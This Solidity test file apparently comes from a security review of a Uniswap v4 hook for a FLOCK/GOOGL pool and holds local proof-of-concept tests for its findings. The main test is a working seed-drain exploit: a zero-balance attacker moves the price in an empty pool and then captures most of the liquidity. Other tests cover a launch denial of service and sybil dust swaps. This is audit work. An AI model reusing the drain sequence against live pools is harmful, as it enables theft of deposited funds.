// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Verifier PoCs against the CURRENT revision of FlockStockPairHook (closedMarketFee, no surge fee, owner-gated
// initializePool, time-based launch decay). Local PoolManager + deterministic mock tokens (GOOGL < FLOCK so FLOCK is
// currency1, exactly like the GOOGL/FLOCK pilot). Nothing here touches a live network.
//   forge test --match-path test/review/VerifierReview.t.sol --skip 01_RegisterPool HookReview EconomicsReview OpsReview UniversalRouterPath -vv

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {LiquidityAmounts} from "@uniswap/v4-core/test/utils/LiquidityAmounts.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {Constants} from "@uniswap/v4-core/test/utils/Constants.sol";
import {PathKey} from "hookmate/interfaces/router/PathKey.sol";

import {EasyPosm} from "../utils/libraries/EasyPosm.sol";
import {BaseTest} from "../utils/BaseTest.sol";
import {FlockStockPairHook} from "../../src/FlockStockPairHook.sol";

/// @dev Direct PoolManager swapper: settles whatever the swap owes (nothing when the delta is 0/0).
contract RawSwapper is IUnlockCallback {
    IPoolManager immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    struct Data {
        PoolKey key;
        SwapParams params;
        address payer;
    }

    function swap(PoolKey memory key, bool zeroForOne, int256 amountSpecified, uint160 limit)
        external
        returns (BalanceDelta d)
    {
        bytes memory r = pm.unlock(
            abi.encode(Data(key, SwapParams({zeroForOne: zeroForOne, amountSpecified: amountSpecified, sqrtPriceLimitX96: limit}), msg.sender))
        );
        d = abi.decode(r, (BalanceDelta));
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        Data memory dt = abi.decode(raw, (Data));
        BalanceDelta d = pm.swap(dt.key, dt.params, "");
        _settle(dt.key.currency0, d.amount0(), dt.payer);
        _settle(dt.key.currency1, d.amount1(), dt.payer);
        return abi.encode(d);
    }

    function _settle(Currency c, int128 amt, address payer) internal {
        if (amt < 0) {
            pm.sync(c);
            MockERC20(Currency.unwrap(c)).transferFrom(payer, address(pm), uint256(uint128(-amt)));
            pm.settle();
        } else if (amt > 0) {
            pm.take(c, payer, uint256(uint128(amt)));
        }
    }
}

contract VerifierReviewTest is BaseTest {
    using EasyPosm for IPositionManager;
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    uint160 constant FLAGS = uint160(Hooks.BEFORE_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG);
    bytes32 constant SWAP_SIG = keccak256("StockPairSwap(bytes32,address,address,bool,int128,int128,int256,uint24,int24)");
    int24 constant INIT_TICK = 90_780;
    int24 constant SP = 60;
    uint256 constant SEED = 2_600_000e18;
    uint256 constant WED_2026_09_02 = 1788350400; // 12:00 UTC
    uint256 constant MON_2026_09_07 = 1788782400; // 12:00 UTC (Labor Day)

    MockERC20 googl; // currency0
    MockERC20 flock; // currency1
    FlockStockPairHook hook;
    RawSwapper raw;
    PoolKey key;
    PoolId poolId;
    uint160 sqrtP0;

    address owner = makeAddr("flockSafe");
    address attacker = makeAddr("attacker");
    address trader = makeAddr("trader");

    // Script 01 defaults (current revision).
    FlockStockPairHook.FeeConfig cfg = FlockStockPairHook.FeeConfig({
        baseFee: 3_000, minFee: 2_500, maxFee: 10_000, launchFee: 10_000, closedMarketFee: 6_000, launchSeconds: 1800
    });

    function setUp() public {
        deployArtifactsAndLabel();
        vm.warp(WED_2026_09_02);
        vm.roll(1_000_000);

        googl = MockERC20(address(uint160(0x2e08) << 144 | 1));
        flock = MockERC20(address(uint160(0x5ab3) << 144 | 1));
        deployCodeTo("lib/uniswap-hooks/lib/v4-core/lib/solmate/src/test/utils/mocks/MockERC20.sol:MockERC20", abi.encode("GOOGL", "GOOGL", uint8(18)), address(googl));
        deployCodeTo("lib/uniswap-hooks/lib/v4-core/lib/solmate/src/test/utils/mocks/MockERC20.sol:MockERC20", abi.encode("FLOCK", "FLOCK", uint8(18)), address(flock));
        vm.label(address(googl), "GOOGL");
        vm.label(address(flock), "FLOCK");

        address hookAddr = address(FLAGS ^ (0x4444 << 144));
        deployCodeTo("FlockStockPairHook.sol:FlockStockPairHook", abi.encode(poolManager, address(flock), owner), hookAddr);
        hook = FlockStockPairHook(hookAddr);
        raw = new RawSwapper(poolManager);

        key = PoolKey(Currency.wrap(address(googl)), Currency.wrap(address(flock)), LPFeeLibrary.DYNAMIC_FEE_FLAG, SP, IHooks(hook));
        poolId = key.toId();
        sqrtP0 = TickMath.getSqrtPriceAtTick(INIT_TICK);

        vm.prank(owner);
        hook.registerPool(key, cfg);

        // seeding wallet approvals (mirror script 02 / LiquidityHelpers)
        flock.mint(address(this), 10 * SEED);
        flock.approve(address(permit2), type(uint256).max);
        permit2.approve(address(flock), address(positionManager), type(uint160).max, type(uint48).max);
        googl.approve(address(permit2), type(uint256).max);
        permit2.approve(address(googl), address(positionManager), type(uint160).max, type(uint48).max);

        _fund(trader);
    }

    // ------------------------------------------------------------------ helpers

    function _fund(address who) internal {
        googl.mint(who, 1_000_000e18);
        flock.mint(who, 100_000_000e18);
        vm.startPrank(who, who);
        googl.approve(address(swapRouter), type(uint256).max);
        flock.approve(address(swapRouter), type(uint256).max);
        googl.approve(address(raw), type(uint256).max);
        flock.approve(address(raw), type(uint256).max);
        vm.stopPrank();
    }

    function _init() internal {
        vm.prank(owner);
        hook.initializePool(key, sqrtP0);
    }

    function _trunc(int24 tick, int24 sp) internal pure returns (int24 t) {
        t = (tick / sp) * sp;
        if (tick < 0 && t != tick) t -= sp;
    }

    /// @dev Exactly what script 02 does for FLOCK = currency1: band [trunc(anchor) - 60*sp, trunc(anchor)], amount0Max = 1.
    function _seedAt(int24 anchor, address recipient) internal returns (uint256 tokenId, int24 lo, int24 hi) {
        hi = _trunc(anchor, SP);
        lo = hi - 60 * SP;
        uint128 liq = LiquidityAmounts.getLiquidityForAmounts(
            TickMath.getSqrtPriceAtTick(anchor), TickMath.getSqrtPriceAtTick(lo), TickMath.getSqrtPriceAtTick(hi), 0, SEED
        );
        (tokenId,) = positionManager.mint(key, lo, hi, liq, 1, SEED + SEED / 1000, recipient, block.timestamp + 3600, "");
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = poolManager.getSlot0(poolId);
    }

    function _buy(address who, uint256 googlIn) internal returns (BalanceDelta d) {
        vm.startPrank(who, who);
        d = swapRouter.swapExactTokensForTokens({
            amountIn: googlIn, amountOutMin: 0, zeroForOne: true, poolKey: key, hookData: "", receiver: who, deadline: block.timestamp + 1
        });
        vm.stopPrank();
    }

    function _sell(address who, uint256 flockIn) internal returns (BalanceDelta d) {
        vm.startPrank(who, who);
        d = swapRouter.swapExactTokensForTokens({
            amountIn: flockIn, amountOutMin: 0, zeroForOne: false, poolKey: key, hookData: "", receiver: who, deadline: block.timestamp + 1
        });
        vm.stopPrank();
    }

    /// @dev Zero-balance attacker, direct PoolManager path, exact-in 1e18 with a far price limit.
    function _freeMove(bool zeroForOne, int24 target) internal returns (BalanceDelta d) {
        vm.prank(attacker, attacker);
        d = raw.swap(key, zeroForOne, -1e18, TickMath.getSqrtPriceAtTick(target));
    }

    function _lastFee() internal returns (bool found, uint24 fee) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(hook) && logs[i].topics.length == 4 && logs[i].topics[0] == SWAP_SIG) {
                found = true;
                (,,,, fee,) = abi.decode(logs[i].data, (bool, int128, int128, int256, uint24, int24));
            }
        }
    }

    // ------------------------------------------------------------------ H-1 / OPS-01 / OPS-02

    /// Safe flow: initializePool lands, seed comes later. Empty pool => any price for free => seed-only mode
    /// (band anchored at the live tick) mints the whole seed where FLOCK is worthless.
    function test_V_H1_emptyPoolFreeMove_thenSeedOnlyModeAtLiveTick_drainsSeed() public {
        _init();
        assertEq(poolManager.getLiquidity(poolId), 0);
        assertEq(flock.balanceOf(attacker), 0);
        assertEq(googl.balanceOf(attacker), 0);

        BalanceDelta d = _freeMove(false, TickMath.MAX_TICK - 1);
        assertEq(d.amount0(), 0);
        assertEq(d.amount1(), 0);
        assertEq(_tick(), TickMath.MAX_TICK - 1, "spot parked at MAX_TICK-1 for gas only");
        FlockStockPairHook.PoolState memory st = hook.poolState(poolId);
        assertEq(st.swapCount, 1, "zero-delta swap recorded");
        assertEq(st.uniqueTraders, 1, "phantom unique trader");

        // Script 02 seed-only mode: p.initTick = liveTick; the new `require(liveTickNow == p.initTick)` compares
        // two reads of the same slot0 in the same simulation and is therefore vacuous here.
        int24 liveTick = _tick();
        (, int24 liveTickNow,,) = poolManager.getSlot0(poolId);
        assertEq(liveTickNow, liveTick, "script guard is trivially satisfied in seed-only mode");
        assertTrue(poolManager.getLiquidity(poolId) == 0, "script's getLiquidity()==0 guard passes at MAX_TICK");

        uint256 before = flock.balanceOf(address(this));
        (, int24 lo, int24 hi) = _seedAt(liveTick, owner);
        console2.log("seed-only band lo/hi:", int256(lo), int256(hi));
        assertApproxEqRel(before - flock.balanceOf(address(this)), SEED, 0.001e18, "2.6M FLOCK minted at the manipulated tick");

        googl.mint(attacker, 1e12);
        vm.startPrank(attacker, attacker);
        googl.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
        BalanceDelta buy = _buy(attacker, 1e12);
        uint256 flockOut = uint256(int256(buy.amount1()));
        uint256 googlPaid = uint256(-int256(buy.amount0()));
        console2.log("attacker FLOCK out (wei):", flockOut);
        console2.log("attacker GOOGL paid (wei):", googlPaid);
        assertGt(flockOut, SEED * 99 / 100, "attacker took >99% of the seed");
        assertLe(googlPaid, 1e12);
    }

    /// EOA flow (band anchored at INIT_TICK from env): an UP move does not enable a drain (band is at the right
    /// price; buyer travels down through empty space for free, then pays fair prices), a DOWN move makes the honest
    /// mint revert (amount0Max = 1) -> launch DoS that pushes the operator into the unsafe seed-only re-run.
    function test_V_OPS02_eoaFlow_upMoveHarmless_downMoveRevertsSeed() public {
        _init();
        uint256 snap = vm.snapshotState();

        _freeMove(false, TickMath.MAX_TICK - 1);
        _seedAt(INIT_TICK, owner); // succeeds: 100% FLOCK band below spot
        BalanceDelta b = _buy(trader, 1e18);
        uint256 out = uint256(int256(b.amount1()));
        // ~8,756 FLOCK/GOOGL minus 1% launch fee and impact
        assertLt(out, 8_756e18);
        assertGt(out, 8_500e18, "buyer pays a fair price even though spot was parked at MAX_TICK");
        vm.revertToState(snap);

        _freeMove(true, TickMath.MIN_TICK + 1);
        assertEq(_tick(), TickMath.MIN_TICK + 1);
        vm.expectRevert();
        this.seedExternal(INIT_TICK);
    }

    function seedExternal(int24 t) external {
        _seedAt(t, owner);
    }

    /// Operational mitigation available today: pause before init, seed, unpause.
    function test_V_mitigation_pauseBeforeInitBlocksFreeMove() public {
        vm.prank(owner);
        hook.setPaused(poolId, true);
        _init();
        vm.prank(attacker, attacker);
        vm.expectRevert();
        raw.swap(key, false, -1e18, TickMath.MAX_SQRT_PRICE - 1);
        assertEq(_tick(), INIT_TICK);
        _seedAt(INIT_TICK, owner); // liquidity ops unaffected by pause
        vm.prank(owner);
        hook.setPaused(poolId, false);
        BalanceDelta b = _buy(trader, 1e18);
        assertGt(int256(b.amount1()), 0);
    }

    // ------------------------------------------------------------------ M-1 / ECO-01 (post-launch, current revision)

    function test_V_M1_launchedPool_freeMoveViaRouterZeroBalance_countersAndGas() public {
        _init();
        _seedAt(INIT_TICK, owner);
        vm.warp(block.timestamp + 3600); // launch decay over
        assertEq(hook.previewFee(poolId), 3_000);

        // reference gas: normal $1k-ish buy from spot
        uint256 snap = vm.snapshotState();
        vm.startPrank(trader, trader);
        uint256 g0 = gasleft();
        swapRouter.swapExactTokensForTokens({amountIn: 3e18, amountOutMin: 0, zeroForOne: true, poolKey: key, hookData: "", receiver: trader, deadline: block.timestamp + 1});
        uint256 gasNormal = g0 - gasleft();
        vm.stopPrank();
        vm.revertToState(snap);

        // attacker holds nothing, uses the stock router
        assertEq(flock.balanceOf(attacker), 0);
        vm.startPrank(attacker, attacker);
        swapRouter.swapExactTokensForTokens({amountIn: 1, amountOutMin: 0, zeroForOne: false, poolKey: key, hookData: "", receiver: attacker, deadline: block.timestamp + 1});
        vm.stopPrank();
        assertEq(_tick(), TickMath.MAX_TICK - 1, "spot teleported through the empty upside");
        FlockStockPairHook.PoolState memory st = hook.poolState(poolId);
        assertEq(st.swapCount, 1);
        assertEq(st.uniqueTraders, 1);
        assertEq(st.flockVolume, 0);
        assertEq(hook.previewFee(poolId), 3_000, "no surge in current revision: fee unaffected");

        vm.startPrank(trader, trader);
        g0 = gasleft();
        BalanceDelta b = swapRouter.swapExactTokensForTokens({amountIn: 3e18, amountOutMin: 0, zeroForOne: true, poolKey: key, hookData: "", receiver: trader, deadline: block.timestamp + 1});
        uint256 gasFromMax = g0 - gasleft();
        vm.stopPrank();
        console2.log("gas normal buy:", gasNormal);
        console2.log("gas buy from MAX_TICK:", gasFromMax);
        assertGt(int256(b.amount1()), 0);
        assertGt(gasFromMax, gasNormal, "first buyer after the teleport pays the bitmap walk");
    }

    // ------------------------------------------------------------------ ECO-05 depletion behaviour (design)

    function test_V_ECO05_depletion_buysRevert_sellsRecover_T0SellIsZeroFill() public {
        _init();
        _seedAt(INIT_TICK, owner);
        // T0 sell: zero fill, but recorded as a swap
        BalanceDelta s0 = _sell(trader, 50_000e18);
        assertEq(s0.amount0(), 0);
        assertEq(s0.amount1(), 0);
        assertEq(hook.poolState(poolId).swapCount, 1);
        assertEq(_tick(), TickMath.MAX_TICK - 1);

        BalanceDelta d = _buy(trader, 1_000e18);
        console2.log("GOOGL consumed to exhaust band (1e-3):", uint256(-int256(d.amount0())) / 1e15);
        console2.log("FLOCK received (whole):", uint256(int256(d.amount1())) / 1e18);
        assertLt(uint256(-int256(d.amount0())), 400e18);
        assertEq(_tick(), TickMath.MIN_TICK, "tick falls through empty space to MIN_TICK");
        vm.startPrank(trader, trader);
        vm.expectRevert();
        swapRouter.swapExactTokensForTokens({amountIn: 1e18, amountOutMin: 0, zeroForOne: true, poolKey: key, hookData: "", receiver: trader, deadline: block.timestamp + 1});
        vm.stopPrank();
        BalanceDelta s = _sell(trader, 100_000e18);
        assertGt(int256(s.amount0()), 0, "sells recover");
    }

    // ------------------------------------------------------------------ L-1 / ECO-07

    function test_V_L1_storedLpFeeNeverRefreshed() public {
        _init();
        _seedAt(INIT_TICK, owner);
        (,,, uint24 lp0) = poolManager.getSlot0(poolId);
        assertEq(lp0, 10_000);
        vm.warp(block.timestamp + 30 days);
        _buy(trader, 1e18);
        (,,, uint24 lp1) = poolManager.getSlot0(poolId);
        assertEq(hook.previewFee(poolId), 3_000);
        assertEq(lp1, 10_000, "slot0.lpFee still the launch fee 30 days later");
    }

    // ------------------------------------------------------------------ L-2

    function test_V_L2_registerAcceptsUninitialisableKeys() public {
        PoolKey memory reversed = PoolKey(Currency.wrap(address(flock)), Currency.wrap(address(googl)), LPFeeLibrary.DYNAMIC_FEE_FLAG, SP, IHooks(hook));
        vm.prank(owner);
        hook.registerPool(reversed, cfg); // accepted
        assertTrue(hook.poolState(reversed.toId()).registered);
        vm.prank(owner);
        vm.expectRevert(); // CurrenciesOutOfOrderOrEqual
        hook.initializePool(reversed, sqrtP0);

        PoolKey memory bigSpacing = PoolKey(Currency.wrap(address(googl)), Currency.wrap(address(flock)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 40_000, IHooks(hook));
        vm.prank(owner);
        hook.registerPool(bigSpacing, cfg); // accepted
        vm.prank(owner);
        vm.expectRevert(); // TickSpacingTooLarge
        hook.initializePool(bigSpacing, sqrtP0);

        PoolKey memory zeroSpacing = PoolKey(Currency.wrap(address(googl)), Currency.wrap(address(flock)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 0, IHooks(hook));
        vm.prank(owner);
        hook.registerPool(zeroSpacing, cfg); // accepted
        vm.prank(owner);
        vm.expectRevert(); // TickSpacingTooSmall
        hook.initializePool(zeroSpacing, sqrtP0);
    }

    // ------------------------------------------------------------------ I-1

    function test_V_I1_renounceSelector() public {
        vm.prank(owner);
        vm.expectRevert(FlockStockPairHook.InvalidFeeConfig.selector);
        hook.renounceOwnership();
    }

    // ------------------------------------------------------------------ ECO-03

    function test_V_ECO03_launchClockStartsAtInit() public {
        _init();
        assertEq(hook.previewFee(poolId), 10_000);
        vm.warp(block.timestamp + 1800); // Safe signers take 30 min to get the seed out
        _seedAt(INIT_TICK, owner);
        assertEq(hook.previewFee(poolId), 3_000, "first real trade already pays base fee");
        vm.recordLogs();
        _buy(trader, 1e18);
        (bool found, uint24 fee) = _lastFee();
        assertTrue(found);
        assertEq(fee, 3_000);
    }

    // ------------------------------------------------------------------ ECO-04 (current revision)

    function test_V_ECO04_closedMarketWindow() public view {
        uint256 fri2100 = WED_2026_09_02 + 2 days + 9 hours; // Fri 2026-09-04 21:00 UTC
        uint256 fri1959 = WED_2026_09_02 + 2 days + 7 hours + 59 minutes;
        uint256 mon1300 = MON_2026_09_07 + 1 hours; // Mon 13:00 UTC pre-open
        uint256 mon1430 = MON_2026_09_07 + 2 hours + 30 minutes;
        uint256 laborDay1800 = MON_2026_09_07 + 6 hours; // Labor Day, market closed in reality
        assertFalse(hook.isMarketClosed(fri1959));
        assertTrue(hook.isMarketClosed(fri2100), "Friday after close now covered");
        assertTrue(hook.isMarketClosed(mon1300), "Monday pre-open now covered");
        assertFalse(hook.isMarketClosed(mon1430));
        assertFalse(hook.isMarketClosed(laborDay1800), "US holidays still not modelled");
    }

    // ------------------------------------------------------------------ ECO-06

    function test_V_ECO06_dustSwapCountsUniqueTrader() public {
        _init();
        _seedAt(INIT_TICK, owner);
        _buy(trader, 1e18);
        uint64 before = hook.poolState(poolId).uniqueTraders;
        address sybil = address(0xBEEF01);
        googl.mint(sybil, 1);
        vm.startPrank(sybil, sybil);
        googl.approve(address(raw), 1);
        BalanceDelta d = raw.swap(key, true, -1, TickMath.MIN_SQRT_PRICE + 1);
        vm.stopPrank();
        assertEq(d.amount1(), 0, "1 wei in, 0 FLOCK out");
        assertEq(hook.poolState(poolId).uniqueTraders, before + 1);
    }

    // ------------------------------------------------------------------ I-4 (transient fee across a multi-hop)

    function test_V_I4_multiHopTwoRegisteredPools_perPoolFee() public {
        _init();
        _seedAt(INIT_TICK, owner);
        // pool B: FLOCK (currency0) / STOCK_B (currency1) full-range, base 2%
        MockERC20 stockB = MockERC20(address(uint160(0x7ab3) << 144 | 1));
        deployCodeTo("lib/uniswap-hooks/lib/v4-core/lib/solmate/src/test/utils/mocks/MockERC20.sol:MockERC20", abi.encode("B", "B", uint8(18)), address(stockB));
        PoolKey memory kB = PoolKey(Currency.wrap(address(flock)), Currency.wrap(address(stockB)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook));
        FlockStockPairHook.FeeConfig memory cfgB = FlockStockPairHook.FeeConfig({baseFee: 20_000, minFee: 5_000, maxFee: 50_000, launchFee: 0, closedMarketFee: 0, launchSeconds: 0});
        vm.startPrank(owner);
        hook.registerPool(kB, cfgB);
        hook.initializePool(kB, Constants.SQRT_PRICE_1_1);
        vm.stopPrank();
        stockB.mint(address(this), 10_000_000e18);
        stockB.approve(address(permit2), type(uint256).max);
        permit2.approve(address(stockB), address(positionManager), type(uint160).max, type(uint48).max);
        {
            int24 lo = TickMath.minUsableTick(60);
            int24 hi = TickMath.maxUsableTick(60);
            uint128 liq = 1_000_000e18;
            (uint256 a0, uint256 a1) = LiquidityAmounts.getAmountsForLiquidity(Constants.SQRT_PRICE_1_1, TickMath.getSqrtPriceAtTick(lo), TickMath.getSqrtPriceAtTick(hi), liq);
            positionManager.mint(kB, lo, hi, liq, a0 + 1, a1 + 1, address(this), block.timestamp, "");
        }
        vm.warp(block.timestamp + 3600);
        PathKey[] memory path = new PathKey[](2);
        path[0] = PathKey(Currency.wrap(address(flock)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook), "");
        path[1] = PathKey(Currency.wrap(address(stockB)), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60, IHooks(hook), "");
        vm.recordLogs();
        vm.startPrank(trader, trader);
        swapRouter.swapExactTokensForTokens(1e18, 0, Currency.wrap(address(googl)), path, trader, block.timestamp + 1);
        vm.stopPrank();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint24[] memory fees = new uint24[](2);
        uint256 n;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(hook) && logs[i].topics[0] == SWAP_SIG) {
                (,,,, uint24 fee,) = abi.decode(logs[i].data, (bool, int128, int128, int256, uint24, int24));
                fees[n++] = fee;
            }
        }
        assertEq(n, 2);
        assertEq(fees[0], 3_000, "pool A fee");
        assertEq(fees[1], 20_000, "pool B fee");
        assertGt(stockB.balanceOf(trader), 0);
    }
}
